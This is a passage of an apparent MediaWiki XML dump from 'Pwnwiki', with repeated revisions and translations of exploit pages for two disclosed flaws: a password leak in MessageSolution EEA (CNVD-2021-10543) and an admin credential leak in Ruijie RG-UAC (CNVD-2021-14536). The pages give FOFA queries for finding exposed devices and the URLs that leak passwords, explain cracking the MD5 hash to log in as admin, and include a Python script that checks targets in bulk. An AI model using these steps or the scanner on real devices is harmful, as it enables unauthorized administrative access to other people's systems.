&lt;/translate&gt;
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/authenticationserverservlet/
&lt;/pre&gt;

[[File:Xnip2021-03-22_15-06-00.jpg | 500px]]

&lt;translate&gt;
&lt;!--T:5--&gt;
使用獲得到的密碼可以登錄系統
&lt;/translate&gt;

[[File:Xnip2021-03-22_15-09-59.jpg | 500px]]

==POC==
https://github.com/Henry4E36/CNVD-2021-10543</text>
      <sha1>o1g8i5kliny917gq9knhatyvpbj9fb3</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-10543 MessageSolution 郵件歸檔系統EEA 信息洩露漏洞/en</title>
    <ns>0</ns>
    <id>4079</id>
    <revision>
      <id>4696</id>
      <timestamp>2021-06-10T03:28:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Visit the following Url"</comment>
      <origin>4696</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="483" sha1="2qu3vvtfagxtie942tad0pgr89lpnb1" xml:space="preserve">&lt;languages  /&gt;
==Vulnerability Impact==

MessageSolution Enterprise Mail Archive Management System EEA


==FOFA==
&lt;pre&gt;
title="MessageSolution Enterprise Email Archiving (EEA)"
&lt;/pre&gt;

==Exploit==

Visit the following Url
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/authenticationserverservlet/
&lt;/pre&gt;

[[File:Xnip2021-03-22_15-06-00.jpg | 500px]]

Use the obtained password to log in to the system

[[File:Xnip2021-03-22_15-09-59.jpg | 500px]]

==POC==
https://github.com/Henry4E36/CNVD-2021-10543</text>
      <sha1>2qu3vvtfagxtie942tad0pgr89lpnb1</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-10543 MessageSolution 郵件歸檔系統EEA 信息洩露漏洞/zh-cn</title>
    <ns>0</ns>
    <id>3145</id>
    <revision>
      <id>3649</id>
      <timestamp>2021-05-30T12:52:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CNVD-2021-10543 MessageSolution 邮件归档系统EEA 信息泄露漏洞"</comment>
      <origin>3649</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="758" sha1="tookwzfnquygkebkpm7c15zpoeqxul6" xml:space="preserve">&lt;languages  /&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞影響==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
MessageSolution 企業郵件歸檔管理系統EEA
&lt;/div&gt;


==FOFA==
&lt;pre&gt;
title="MessageSolution Enterprise Email Archiving (EEA)"
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞利用==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
訪問如下Url
&lt;/div&gt;
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/authenticationserverservlet/
&lt;/pre&gt;

[[File:Xnip2021-03-22_15-06-00.jpg | 500px]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
使用獲得到的密碼可以登錄系統
&lt;/div&gt;

[[File:Xnip2021-03-22_15-09-59.jpg | 500px]]

==POC==
https://github.com/Henry4E36/CNVD-2021-10543</text>
      <sha1>tookwzfnquygkebkpm7c15zpoeqxul6</sha1>
    </revision>
    <revision>
      <id>3655</id>
      <parentid>3649</parentid>
      <timestamp>2021-05-30T12:53:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞利用=="</comment>
      <origin>3655</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="514" sha1="5dyirz2vvkk6yukvgoet3huqh2cv5tn" xml:space="preserve">&lt;languages  /&gt;
==漏洞影响==

MessageSolution 企业邮件归档管理系统EEA


==FOFA==
&lt;pre&gt;
title="MessageSolution Enterprise Email Archiving (EEA)"
&lt;/pre&gt;

==漏洞利用==

访问如下Url
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/authenticationserverservlet/
&lt;/pre&gt;

[[File:Xnip2021-03-22_15-06-00.jpg | 500px]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
使用獲得到的密碼可以登錄系統
&lt;/div&gt;

[[File:Xnip2021-03-22_15-09-59.jpg | 500px]]

==POC==
https://github.com/Henry4E36/CNVD-2021-10543</text>
      <sha1>5dyirz2vvkk6yukvgoet3huqh2cv5tn</sha1>
    </revision>
    <revision>
      <id>3657</id>
      <parentid>3655</parentid>
      <timestamp>2021-05-30T12:54:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影响=="</comment>
      <origin>3657</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="453" sha1="ef8l734sop8c48kkesy5pu0d3q8a4f7" xml:space="preserve">&lt;languages  /&gt;
==漏洞影响==

MessageSolution 企业邮件归档管理系统EEA


==FOFA==
&lt;pre&gt;
title="MessageSolution Enterprise Email Archiving (EEA)"
&lt;/pre&gt;

==漏洞利用==

访问如下Url
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/authenticationserverservlet/
&lt;/pre&gt;

[[File:Xnip2021-03-22_15-06-00.jpg | 500px]]

使用获得到的密码可以登录系统

[[File:Xnip2021-03-22_15-09-59.jpg | 500px]]

==POC==
https://github.com/Henry4E36/CNVD-2021-10543</text>
      <sha1>ef8l734sop8c48kkesy5pu0d3q8a4f7</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-10543 MessageSolution 郵件歸檔系統EEA 信息洩露漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3067</id>
    <revision>
      <id>3568</id>
      <timestamp>2021-05-26T13:45:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "使用獲得到的密碼可以登錄系統"</comment>
      <origin>3568</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="453" sha1="gmjm55wgueje84rgv0wjsytzsr3otph" xml:space="preserve">&lt;languages  /&gt;
==漏洞影響==

MessageSolution 企業郵件歸檔管理系統EEA


==FOFA==
&lt;pre&gt;
title="MessageSolution Enterprise Email Archiving (EEA)"
&lt;/pre&gt;

==漏洞利用==

訪問如下Url
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/authenticationserverservlet/
&lt;/pre&gt;

[[File:Xnip2021-03-22_15-06-00.jpg | 500px]]

使用獲得到的密碼可以登錄系統

[[File:Xnip2021-03-22_15-09-59.jpg | 500px]]

==POC==
https://github.com/Henry4E36/CNVD-2021-10543</text>
      <sha1>gmjm55wgueje84rgv0wjsytzsr3otph</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-14536 銳捷RG-UAC信息洩露漏洞</title>
    <ns>0</ns>
    <id>141</id>
    <revision>
      <id>226</id>
      <timestamp>2021-03-08T06:28:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「&lt;languages  /&gt;  ==FOFA== &lt;pre&gt;  title="RG-UAC登录页面" &amp;&amp; body="admin" &lt;/pre&gt;  &lt;translate&gt;F12查看網頁源碼搜索關鍵字&lt;/translate&gt;&lt;code&gt;admin&lt;/code&gt; […」的新頁面</comment>
      <origin>226</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2381" sha1="frjin0hxoie0q3uo6q86uae8ev3r5bl" xml:space="preserve">&lt;languages  /&gt;

==FOFA==
&lt;pre&gt;
 title="RG-UAC登录页面" &amp;&amp; body="admin"
&lt;/pre&gt;

&lt;translate&gt;F12查看網頁源碼搜索關鍵字&lt;/translate&gt;&lt;code&gt;admin&lt;/code&gt;
[[檔案:Cnvd1.jpg|400px]]
&lt;translate&gt;使用 password值 md5解密即可登錄。(用戶名admin)&lt;/translate&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统                             \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "super_admin" in response.text and "password" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,F12查看源码获取密码md5值 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] 请求报错 \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"))
    Scan(file_name)
&lt;/pre&gt;

&lt;translate&gt;==參考==&lt;/translate&gt;
https://mp.weixin.qq.com/s/LbSPzt__mKdNN83RhJ2bwA</text>
      <sha1>frjin0hxoie0q3uo6q86uae8ev3r5bl</sha1>
    </revision>
    <revision>
      <id>227</id>
      <parentid>226</parentid>
      <timestamp>2021-03-08T06:28:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>227</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2382" sha1="8ppq701vyi5b1lpcsmzzunjzhhwmok3" xml:space="preserve">&lt;languages  /&gt;

==FOFA==
&lt;pre&gt;
 title="RG-UAC登录页面" &amp;&amp; body="admin"
&lt;/pre&gt;

&lt;translate&gt;F12查看網頁源碼搜索關鍵字&lt;/translate&gt;&lt;code&gt;admin&lt;/code&gt;
[[檔案:Cnvd1.jpg|400px]]

&lt;translate&gt;使用 password值 md5解密即可登錄。(用戶名admin)&lt;/translate&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统                             \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "super_admin" in response.text and "password" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,F12查看源码获取密码md5值 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] 请求报错 \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"))
    Scan(file_name)
&lt;/pre&gt;

&lt;translate&gt;==參考==&lt;/translate&gt;
https://mp.weixin.qq.com/s/LbSPzt__mKdNN83RhJ2bwA</text>
      <sha1>8ppq701vyi5b1lpcsmzzunjzhhwmok3</sha1>
    </revision>
    <revision>
      <id>228</id>
      <parentid>227</parentid>
      <timestamp>2021-03-08T06:28:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>228</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2383" sha1="3r1tm4icjnrpw2i4zha89krug3x4isl" xml:space="preserve">&lt;languages  /&gt;

==FOFA==
&lt;pre&gt;
 title="RG-UAC登录页面" &amp;&amp; body="admin"
&lt;/pre&gt;

&lt;translate&gt;F12查看網頁源碼搜索關鍵字&lt;/translate&gt;&lt;code&gt;admin&lt;/code&gt;

[[檔案:Cnvd1.jpg|400px]]

&lt;translate&gt;使用 password值 md5解密即可登錄。(用戶名admin)&lt;/translate&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统                             \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "super_admin" in response.text and "password" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,F12查看源码获取密码md5值 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] 请求报错 \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"))
    Scan(file_name)
&lt;/pre&gt;

&lt;translate&gt;==參考==&lt;/translate&gt;
https://mp.weixin.qq.com/s/LbSPzt__mKdNN83RhJ2bwA</text>
      <sha1>3r1tm4icjnrpw2i4zha89krug3x4isl</sha1>
    </revision>
    <revision>
      <id>229</id>
      <parentid>228</parentid>
      <timestamp>2021-03-08T06:29:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>已標記此版本用來翻譯</comment>
      <origin>229</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2416" sha1="s78clodybkprjdzta1rku06cg3w2gyw" xml:space="preserve">&lt;languages  /&gt;

==FOFA==
&lt;pre&gt;
 title="RG-UAC登录页面" &amp;&amp; body="admin"
&lt;/pre&gt;

&lt;translate&gt;&lt;!--T:1--&gt; F12查看網頁源碼搜索關鍵字&lt;/translate&gt;&lt;code&gt;admin&lt;/code&gt;

[[檔案:Cnvd1.jpg|400px]]

&lt;translate&gt;&lt;!--T:2--&gt; 使用 password值 md5解密即可登錄。(用戶名admin)&lt;/translate&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统                             \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "super_admin" in response.text and "password" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,F12查看源码获取密码md5值 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] 请求报错 \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"))
    Scan(file_name)
&lt;/pre&gt;

&lt;translate&gt;==參考== &lt;!--T:3--&gt;&lt;/translate&gt;
https://mp.weixin.qq.com/s/LbSPzt__mKdNN83RhJ2bwA</text>
      <sha1>s78clodybkprjdzta1rku06cg3w2gyw</sha1>
    </revision>
    <revision>
      <id>235</id>
      <parentid>229</parentid>
      <timestamp>2021-03-09T07:25:57Z</timestamp>
      <contributor>
        <username>Test123</username>
        <id>12</id>
      </contributor>
      <comment>/* FOFA */</comment>
      <origin>235</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2455" sha1="oj4ac1elz0u8r4t1zd0jbq2atna88iz" xml:space="preserve">&lt;languages /&gt;
==FOFA==
&lt;pre&gt;
 title="RG-UAC登录页面" &amp;&amp; body="admin"
&lt;/pre&gt;
&lt;translate&gt;&lt;!--T:1--&gt; F12查看網頁源碼搜索關鍵字&lt;/translate&gt;&lt;code&gt;admin&lt;/code&gt;

或在URL后拼接/get_dkey.php?user=admin

[[檔案:Cnvd1.jpg|400px]]

&lt;translate&gt;&lt;!--T:2--&gt; 使用 password值 md5解密即可登錄。(用戶名admin)&lt;/translate&gt;
==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统                             \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "super_admin" in response.text and "password" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,F12查看源码获取密码md5值 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] 请求报错 \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"))
    Scan(file_name)
&lt;/pre&gt;
&lt;translate&gt;==參考== &lt;!--T:3--&gt;&lt;/translate&gt;
https://mp.weixin.qq.com/s/LbSPzt__mKdNN83RhJ2bwA</text>
      <sha1>oj4ac1elz0u8r4t1zd0jbq2atna88iz</sha1>
    </revision>
    <revision>
      <id>620</id>
      <parentid>235</parentid>
      <timestamp>2021-03-22T10:35:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>620</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2453" sha1="oc13gllvo95fdhj2ll36w0vwjy21hr3" xml:space="preserve">&lt;languages /&gt;
==FOFA==
&lt;pre&gt;
 title="RG-UAC登录页面" &amp;&amp; body="admin"
&lt;/pre&gt;
&lt;translate&gt;&lt;!--T:1--&gt; F12查看網頁源碼搜索關鍵字&lt;/translate&gt;&lt;code&gt;admin&lt;/code&gt;

或在URL后拼接/get_dkey.php?user=admin

[[File:Cnvd1.jpg|400px]]

&lt;translate&gt;&lt;!--T:2--&gt; 使用 password值 md5解密即可登錄。(用戶名admin)&lt;/translate&gt;
==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统                             \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "super_admin" in response.text and "password" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,F12查看源码获取密码md5值 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] 请求报错 \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"))
    Scan(file_name)
&lt;/pre&gt;
&lt;translate&gt;==參考== &lt;!--T:3--&gt;&lt;/translate&gt;
https://mp.weixin.qq.com/s/LbSPzt__mKdNN83RhJ2bwA</text>
      <sha1>oc13gllvo95fdhj2ll36w0vwjy21hr3</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-14536 銳捷RG-UAC信息洩露漏洞/zh-cn</title>
    <ns>0</ns>
    <id>430</id>
    <revision>
      <id>618</id>
      <timestamp>2021-03-22T09:20:27Z</timestamp>
      <contributor>
        <username>Fairycn</username>
        <id>20</id>
      </contributor>
      <comment>Created page with "使用password值 md5解密即可登录。(用户名admin)"</comment>
      <origin>618</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2313" sha1="91ysi9lz0cr2cz62al7csx31sacqa6s" xml:space="preserve">&lt;languages  /&gt;

==FOFA==
&lt;pre&gt;
 title="RG-UAC登录页面" &amp;&amp; body="admin"
&lt;/pre&gt;

F12查看网页源码搜索关键字&lt;code&gt;admin&lt;/code&gt;

[[檔案:Cnvd1.jpg|400px]]

使用password值 md5解密即可登录。(用户名admin)

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统                             \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "super_admin" in response.text and "password" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,F12查看源码获取密码md5值 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] 请求报错 \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"))
    Scan(file_name)
&lt;/pre&gt;

==参考==
https://mp.weixin.qq.com/s/LbSPzt__mKdNN83RhJ2bwA</text>
      <sha1>91ysi9lz0cr2cz62al7csx31sacqa6s</sha1>
    </revision>
    <revision>
      <id>854</id>
      <parentid>618</parentid>
      <timestamp>2021-04-01T04:23:25Z</timestamp>
      <contributor>
        <username>FuzzyBot</username>
        <id>11</id>
      </contributor>
      <comment>Updating to match new version of source page</comment>
      <origin>854</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2350" sha1="hotq5qdg6kcofmj0yse4301h47lublz" xml:space="preserve">&lt;languages /&gt;
==FOFA==
&lt;pre&gt;
 title="RG-UAC登录页面" &amp;&amp; body="admin"
&lt;/pre&gt;
F12查看网页源码搜索关键字&lt;code&gt;admin&lt;/code&gt;

或在URL后拼接/get_dkey.php?user=admin

[[File:Cnvd1.jpg|400px]]

使用password值 md5解密即可登录。(用户名admin)
==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统                             \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "super_admin" in response.text and "password" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,F12查看源码获取密码md5值 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] 请求报错 \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"))
    Scan(file_name)
&lt;/pre&gt;
==参考==
https://mp.weixin.qq.com/s/LbSPzt__mKdNN83RhJ2bwA</text>
      <sha1>hotq5qdg6kcofmj0yse4301h47lublz</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2021-14536 銳捷RG-UAC信息洩露漏洞/zh-hant</title>
    <ns>0</ns>
    <id>2962</id>
    <revision>
      <id>3463</id>
      <timestamp>2021-05-26T13:28:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "F12查看網頁源碼搜索關鍵字"</comment>
      <origin>3463</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2351" sha1="1o6dis5kbs9ms77fehkgqugoiun56vn" xml:space="preserve">&lt;languages /&gt;
==FOFA==
&lt;pre&gt;
 title="RG-UAC登录页面" &amp;&amp; body="admin"
&lt;/pre&gt;
F12查看網頁源碼搜索關鍵字&lt;code&gt;admin&lt;/code&gt;

或在URL后拼接/get_dkey.php?user=admin

[[File:Cnvd1.jpg|400px]]

使用 password值 md5解密即可登錄。(用戶名admin)
==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统                             \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
